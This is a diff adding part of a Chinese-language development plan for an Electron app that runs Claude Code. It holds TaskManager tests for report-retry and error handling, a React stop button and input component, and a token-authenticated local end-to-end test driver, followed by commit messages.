+    const { tm, claude, repo, id } = await toImplementing({ verify })
+    claude.script = async ({ sink }) => {
+      await sink.submitReport(sampleReport)
+    }
+    await tm.send(id, 'main', '完成')
+    await until(() => verify.mock.calls.length === 1)
+    const saved = (await repo.listTasks()).find((t) => t.id === id)!
+    expect(saved).toMatchObject({
+      runState: 'finalizing',
+      pendingReport: { input: sampleReport, commit: 'abc123' }
+    })
+    release()
+    await tm.whenIdle(id)
+    expect(tm.get(id)).toMatchObject({ status: 'reviewing', reportVersions: [1] })
+    expect(tm.get(id).pendingReport).toBeUndefined()
+  })
+
+  test('關閉 app 時整理被中斷：重新啟動後「繼續」直接重新整理報告，不再呼叫 Claude', async () => {
+    const verify = vi.fn<TaskManagerDeps['verify']>(async (_cwd, commands, _ok, signal) => {
+      await new Promise((r) => signal!.addEventListener('abort', r, { once: true }))
+      return commands.map((command) => ({ command, exitCode: null, durationMs: 1, outputTail: '' }))
+    })
+    const { tm, claude, git, repo, id } = await toImplementing({ verify })
+    // 第一次整理已經 commit 了；重試時沒有新的變更（commitAll 回傳 null）就沿用那個 commit
+    git.commitAll = vi
+      .fn<typeof git.commitAll>()
+      .mockResolvedValueOnce('abc123')
+      .mockResolvedValue(null)
+    claude.script = async ({ sink }) => {
+      await sink.submitReport(sampleReport)
+    }
+    await tm.send(id, 'main', '完成')
+    await until(() => verify.mock.calls.length === 1)
+    await tm.shutdown(3000)
+    expect(tm.get(id)).toMatchObject({ runState: 'interrupted', reportVersions: [] })
+
+    // 重新啟動
+    const claude2 = new FakeClaude()
+    const verify2 = vi.fn<TaskManagerDeps['verify']>(async (_cwd, commands) =>
+      commands.map((command) => ({ command, exitCode: 0, durationMs: 1, outputTail: 'ok' }))
+    )
+    const tm2 = new TaskManager({
+      repo,
+      git,
+      queryFn: claude2.queryFn,
+      createToolServer: claude2.createToolServer,
+      getClaudePath: () => '/bin/claude',
+      emit: () => {},
+      verify: verify2,
+      now: () => '2026-10-07T11:00:00.000Z'
+    })
+    await tm2.init()
+    expect(tm2.get(id)).toMatchObject({
+      runState: 'interrupted',
+      pendingReport: { input: sampleReport, commit: 'abc123' }
+    })
+    await tm2.resume(id)
+    await tm2.whenIdle(id)
+    expect(claude2.calls).toHaveLength(0)
+    expect(verify2).toHaveBeenCalledTimes(1)
+    expect(tm2.get(id)).toMatchObject({
+      status: 'reviewing',
+      runState: 'idle',
+      error: undefined,
+      reportVersions: [1]
+    })
+    expect(tm2.get(id).pendingReport).toBeUndefined()
+    expect(await repo.getReport(id, 1)).toMatchObject({ input: sampleReport, commit: 'abc123' })
+    expect(claude.calls.at(-1)!.prompt).toBe('完成')
+  })
+
+  test('commit 失敗：顯示錯誤、保留報告；「繼續」重試整理，不再呼叫 Claude', async () => {
+    const { tm, claude, git, id } = await toImplementing()
+    let fail = true
+    git.commitAll = async () => {
+      if (fail) throw new Error('git commit 失敗：執行逾時（超過 120 秒），已終止')
+      return 'def456'
+    }
+    claude.script = async ({ sink }) => {
+      await sink.submitReport(sampleReport)
+    }
+    await tm.send(id, 'main', '完成')
+    await tm.whenIdle(id)
+    expect(tm.get(id)).toMatchObject({
+      status: 'implementing',
+      runState: 'error',
+      error: '整理報告失敗：git commit 失敗：執行逾時（超過 120 秒），已終止',
+      pendingReport: { input: sampleReport }
+    })
+    const calls = claude.calls.length
+    fail = false
+    await tm.resume(id)
+    await tm.whenIdle(id)
+    expect(claude.calls).toHaveLength(calls)
+    expect(tm.get(id)).toMatchObject({
+      status: 'reviewing',
+      runState: 'idle',
+      error: undefined,
+      reportVersions: [1]
+    })
+    expect((await tm.getReport(id, 1)).commit).toBe('def456')
+  })
+
+  test('整理失敗後改為繼續和 Claude 對話：放棄待整理的報告，之後的「繼續」照常續接 Claude', async () => {
+    const { tm, claude, git, id } = await toImplementing()
+    git.commitAll = async () => {
+      throw new Error('boom')
+    }
+    claude.script = async ({ sink }) => {
+      await sink.submitReport(sampleReport)
+    }
+    await tm.send(id, 'main', '完成')
+    await tm.whenIdle(id)
+    expect(tm.get(id).pendingReport).toBeDefined()
+    claude.script = async () => {
+      throw new Error('CLI crashed')
+    }
+    await tm.send(id, 'main', '先看一下為什麼失敗')
+    await tm.whenIdle(id)
+    expect(tm.get(id).pendingReport).toBeUndefined()
+    expect(tm.get(id).runState).toBe('error')
+    claude.script = async () => []
+    await tm.resume(id)
+    await tm.whenIdle(id)
+    expect(claude.calls.at(-1)!.prompt).toContain('[resume]')
+  })
+
+  test('訂閱額度用盡：時間軸顯示限制資訊，任務標為發生錯誤，「繼續」以 resume 續接', async () => {
+    const { tm, claude, create } = await setup()
+    const id = await create()
+    claude.script = async () => [
+      {
+        type: 'rate_limit_event',
+        rate_limit_info: { status: 'rejected', rateLimitType: 'five_hour' }
+      },
+      {
+        type: 'assistant',
+        parent_tool_use_id: null,
+        error: 'rate_limit',
+        message: { content: [] }
+      },
+      {
+        type: 'result',
+        subtype: 'success',
+        is_error: true,
+        result: 'Claude AI usage limit reached'
+      }
+    ]
+    await tm.send(id, 'main', '繼續做')
+    await tm.whenIdle(id)
+    expect(tm.get(id)).toMatchObject({ runState: 'error', error: 'Claude AI usage limit reached' })
+    const notices = (await tm.timeline(id)).filter((e) => e.kind === 'system').map((e) => e.text)
+    expect(notices).toEqual(['已達到訂閱方案的用量上限（5 小時）。', '已達到用量上限，請稍後再試'])
+    claude.script = async () => []
+    await tm.resume(id)
+    await tm.whenIdle(id)
+    expect(claude.calls.at(-1)).toMatchObject({
+      prompt: expect.stringContaining('[resume]'),
+      options: { resume: 'sess-0' }
+    })
+    expect(tm.get(id)).toMatchObject({ runState: 'idle', error: undefined })
+  })
+
+  test('主線的錯誤仍記在任務上，標為發生錯誤（可「繼續」）', async () => {
+    const { tm, claude, create } = await setup()
+    const id = await create()
+    claude.script = async () => [{ type: 'result', subtype: 'error_during_execution' }]
+    await tm.send(id, 'main', '失敗')
+    await tm.whenIdle(id)
+    expect(tm.get(id)).toMatchObject({ runState: 'error', error: '執行時發生錯誤' })
+    claude.script = async () => []
+    await tm.send(id, 'main', '再一次')
+    await tm.whenIdle(id)
+    expect(tm.get(id).error).toBeUndefined()
+  })
+```
+
+`tests/renderer/ClarifyScreen.test.tsx`（Task 30 的區塊是當時的版本）加上：
+
+```tsx
+test('主線執行中（含等待核准）可以停止；連點只送一次；停下來後不顯示', async () => {
+  const view = render(
+    <ClarifyScreen
+      task={makeTask({ runState: 'running' })}
+      nav={null}
+      readOnly={false}
+      onOpenStage={() => {}}
+    />
+  )
+  const release = holdNextCall(vi.mocked(call))
+  const stop = screen.getByRole('button', { name: '停止' })
+  await userEvent.dblClick(stop)
+  expect(vi.mocked(call).mock.calls.filter(([ch]) => ch === 'run:stop')).toEqual([
+    ['run:stop', 't1', 'main']
+  ])
+  expect(stop).toBeDisabled()
+  await release()
+  view.rerender(
+    <ClarifyScreen
+      task={makeTask({ runState: 'idle' })}
+      nav={null}
+      readOnly={false}
+      onOpenStage={() => {}}
+    />
+  )
+  expect(screen.queryByRole('button', { name: '停止' })).not.toBeInTheDocument()
+  view.rerender(
+    <ClarifyScreen
+      task={makeTask({ runState: 'running' })}
+      nav={null}
+      readOnly
+      onOpenStage={() => {}}
+    />
+  )
+  expect(screen.queryByRole('button', { name: '停止' })).not.toBeInTheDocument()
+})
+```
+
+**Step 2: 確認失敗** — `npx vitest run tests/main tests/renderer` → 上面新增的測試失敗（M1 的測試固定既有行為，一開始就通過）。
+
+**Step 3: 實作**
+
+`src/shared/types.ts`：`Task` 加上 `pendingReport?: PendingReport`，`ClaudeStatus` 加上 `ignoredEnv?: string[]`（「啟動時環境裡有、但 Harness 不傳給 Claude Code 的變數」），`TimelineEvent.tool` 加上 `subagent?: boolean`（「工具呼叫：子代理（Agent／Task 工具）裡的呼叫」）；放在 `Task` 之前：
+
+```ts
+/** 已提交、還沒整理完的報告：整理被中斷或失敗時，「繼續」用它直接重新整理（不再呼叫 Claude） */
+export interface PendingReport {
+  input: ReportInput
+  /** 之前的整理已經做好的 commit（重試時沒有新的變更就沿用） */
+  commit?: string
+}
+```
+
+`src/renderer/src/components/Composer.tsx`（最終版本；Task 30 的區塊是當時的版本，`inputRef` 見 Task 32）：
+
+```tsx
+// src/renderer/src/components/Composer.tsx
+import { type FormEvent, type ReactNode, type Ref, useState } from 'react'
+import type { Channel } from '@shared/types'
+import { call } from '../api'
+import { blockImeSubmit } from '../lib/ime'
+import { usePending } from '../lib/usePending'
+import { useStore } from '../store'
+import { cx, Icons } from './ui'
+
+/**
+ * 停止 Claude 在這個 channel（主線或分岔）的這一輪（`run:stop`）。
+ * 停止進行中停用，連點只送一次；放在輸入列旁（Composer 的 extra 或分岔的輸入框旁）。
+ */
+export function StopButton({
+  taskId,
+  channel,
+  className
+}: {
+  taskId: string
+  channel: Channel
+  className?: string
+}) {
+  const act = useStore((s) => s.act)
+  const [stopping, run] = usePending()
+  return (
+    <button
+      type="button"
+      disabled={stopping}
+      onClick={() => void run(() => act(() => call('run:stop', taskId, channel)))}
+      className={cx(
+        'flex h-10 flex-none cursor-pointer items-center gap-1.5 rounded-full bg-surface px-4 text-[13px] text-danger disabled:cursor-default disabled:opacity-50',
+        className
+      )}
+    >
+      <Icons.Stop width={12} height={12} />
+      停止
+    </button>
+  )
+}
+
+/** 畫面底部的圓角輸入列（對照 `StyleB.dc.html` 底部的訊息框） */
+export function Composer({
+  placeholder,
+  disabled,
+  onSend,
+  extra,
+  label = '訊息',
+  inputRef
+}: {
+  placeholder: string
+  disabled?: boolean
+  onSend: (text: string) => void
+  extra?: ReactNode
+  label?: string
+  /** 畫面需要把焦點放回輸入框時用（例如核准對話框關掉後） */
+  inputRef?: Ref<HTMLInputElement>
+}) {
+  const [text, setText] = useState('')
+  const submit = (e: FormEvent) => {
+    e.preventDefault()
+    if (!text.trim() || disabled) return
+    onSend(text.trim())
+    setText('')
+  }
+  return (
+    <form
+      onSubmit={submit}
+      className="flex items-center gap-2 rounded-full bg-fill py-2 pr-2 pl-[18px]"
+    >
+      <label className="flex flex-1">
+        <span className="sr-only">{label}</span>
+        <input
+          ref={inputRef}
+          value={text}
+          onChange={(e) => setText(e.target.value)}
+          onKeyDown={blockImeSubmit}
+          placeholder={placeholder}
+          disabled={disabled}
+          className="h-8 flex-1 border-none bg-transparent text-ink outline-none placeholder:text-muted-2"
+        />
+      </label>
+      {extra}
+      <button
+        type="submit"
+        aria-label="送出"
+        disabled={disabled || !text.trim()}
+        className="flex size-10 flex-none cursor-pointer items-center justify-center rounded-full bg-brand text-white hover:bg-brand-hover disabled:cursor-default disabled:opacity-40"
+      >
+        <Icons.Send />
+      </button>
+    </form>
+  )
+}
+```
+
+`scripts/e2e/driver.mjs`：檔頭說明加上 `<dir>/token` 與伺服器接受的請求；import `randomBytes`、`timingSafeEqual`（`node:crypto`）；`dataDir` 之後：
+
+```js
+const tokenFile = join(dir, 'token')
+const token = randomBytes(32).toString('hex')
+const TOKEN_HEADER = 'x-harness-e2e-token'
+```
+
+指令伺服器之前：
+
+```js
+/** 權杖寫到 <dir>/token，只有自己讀得到；先刪掉舊檔，權限才一定是 0600 */
+function writeToken() {
+  rmSync(tokenFile, { force: true })
+  writeFileSync(tokenFile, token, { mode: 0o600 })
+}
+const removeToken = () => rmSync(tokenFile, { force: true })
+
+const sameToken = (got) => {
+  const a = Buffer.from(typeof got === 'string' ? got : '')
+  const b = Buffer.from(token)
+  return a.length === b.length && timingSafeEqual(a, b)
+}
+
+/** 不接受的請求回傳 [狀態碼, 原因]；接受時 undefined */
+function rejection(req) {
+  if (req.method !== 'POST') return [405, '只接受 POST']
+  if (req.url !== '/run' && req.url !== '/quit') return [404, '沒有這個路徑']
+  // 瀏覽器發出的請求都帶 Origin（網頁不能用 fetch 對本機伺服器下指令）；Host 不對時可能是 DNS rebinding
+  if (req.headers.origin !== undefined) return [403, '拒絕瀏覽器發出的請求']
+  if (req.headers.host !== `127.0.0.1:${port}`) return [403, 'Host 不正確']
+  if (!sameToken(req.headers[TOKEN_HEADER])) return [401, '權杖不正確']
+  return undefined
+}
+
+prepare()
+writeToken()
+process.on('exit', removeToken)
+for (const sig of ['SIGINT', 'SIGTERM']) process.on(sig, () => process.exit(130))
+await launch()
+```
+
+```js
+let busy = Promise.resolve()
+createServer((req, res) => {
+  const bad = rejection(req)
+  if (bad) {
+    logLine('driver', `rejected ${req.method} ${req.url}: ${bad[1]}`)
+    res.writeHead(bad[0], {
+      'content-type': 'application/json; charset=utf-8',
+      connection: 'close'
+    })
+    res.end(JSON.stringify({ ok: false, error: bad[1] }))
+    req.resume()
+    return
+  }
+  // …以下同 Task 35（依序執行 /run 的程式碼、/quit 關閉 app）
+```
+
+`scripts/e2e/run.mjs`：
+
+```js
+#!/usr/bin/env node
+// scripts/e2e/run.mjs — 送一段 async JS 給 driver.mjs 執行並印出結果
+// 用法：node scripts/e2e/run.mjs --dir <E2E 資料夾> '<code>'；沒有 code 時從 stdin 讀；
+// --quit 關閉 app 與 driver。E2E 資料夾也可以用環境變數 E2E_DIR 指定，
+// 環境變數 E2E_PORT 指定 driver 的 port（預設 47123）。
+// 權杖從 <E2E 資料夾>/token 讀（driver 啟動時產生），放在 x-harness-e2e-token 標頭。
+// 用 node:http 而不是 fetch：等待 Claude 的指令可能跑好幾分鐘，fetch 預設 5 分鐘就逾時
+import { readFileSync } from 'node:fs'
+import { request } from 'node:http'
+import { join } from 'node:path'
+
+const args = process.argv.slice(2)
+let dir = process.env.E2E_DIR
+const at = args.indexOf('--dir')
+if (at >= 0) {
+  dir = args[at + 1]
+  args.splice(at, 2)
+}
+if (!dir) {
+  console.error("用法：node scripts/e2e/run.mjs --dir <E2E 資料夾> '<code>'（或設定 E2E_DIR）")
+  process.exit(1)
+}
+let token
+try {
+  token = readFileSync(join(dir, 'token'), 'utf8').trim()
+} catch {
+  console.error(`讀不到 ${join(dir, 'token')}：driver.mjs 是否已用 --dir ${dir} 啟動？`)
+  process.exit(1)
+}
+
+const port = Number(process.env.E2E_PORT ?? '47123')
+const quit = args[0] === '--quit'
+let code = quit ? '' : args.join(' ')
+if (!quit && !code) {
+  for await (const chunk of process.stdin) code += chunk
+}
+
+const { status, body } = await new Promise((resolveBody, reject) => {
+  const req = request(
+    {
+      host: '127.0.0.1',
+      port,
+      method: 'POST',
+      path: quit ? '/quit' : '/run',
+      headers: {
+        'content-type': 'text/plain; charset=utf-8',
+        'x-harness-e2e-token': token
+      }
+    },
+    (res) => {
+      let data = ''
+      res.setEncoding('utf8')
+      res.on('data', (c) => (data += c))
+      res.on('end', () => resolveBody({ status: res.statusCode, body: data }))
+    }
+  )
+  req.on('error', reject)
+  req.end(code)
+})
+
+let out
+try {
+  out = JSON.parse(body)
+} catch {
+  out = { ok: false, error: `driver 回應 ${status}：${body}` }
+}
+if (out.ok) {
+  const r = out.result
+  console.log(typeof r === 'string' ? r : JSON.stringify(r, null, 2))
+  console.error(`(${out.ms} ms)`)
+} else {
+  console.error(out.error)
+  process.exitCode = 1
+}
+```
+
+其餘程式碼見上面列出的各 Task 區塊。`package.json` 刪掉 `"author": "example.com"` 與 `"homepage": "https://electron-vite.org"`，`git rm resources/icon.png`。
+
+**Step 4: 確認通過** — `npm test`（51 個檔案、744 個測試，連跑兩次）、`npm run typecheck`、`npm run lint`、`npx electron-vite build` 通過。以 `scripts/e2e/driver.mjs --dir <暫存資料夾> --port 47199 --fresh` 啟動建置好的 app（不呼叫 Claude）手動確認：`<暫存資料夾>/token` 權限 0600；沒有權杖或權杖錯誤 401、GET 405、其他路徑 404、帶 `Origin` 403、Host 不對 403，正確的權杖與 `run.mjs --dir` 都能執行；`--quit` 後權杖檔刪除；設定頁的固定規則顯示 git hooks。
+
+**Commit**
+
+```bash
+git commit -m "fix(main): never run repo git hooks on Harness's own commit; time out git
+
+Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
+# 依序：
+# fix(main): always use the Claude Code subscription login
+# fix(main): retry an interrupted or failed report without asking Claude
+# test(main): pin WebFetch and WebSearch approval in every open stage
+# fix: warn about broad or risky patterns in the approval dialog
+# feat(ui): stop Claude from the clarify screen and from a branch
+# feat: show subagent tool calls in the timeline, labelled 子代理
+# fix(main): mark a failed main turn as an error so 繼續 is offered
+# chore: remove unused Panel, icon and template package fields
+# fix(e2e): require a token for the manual E2E driver's command server
+# docs: drop the absolute personal path from the plan's conventions
+# docs: add a README
+git add docs
+git commit -m "docs: record the final review fixes in the plan (Task 39)
 
 Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
 ```
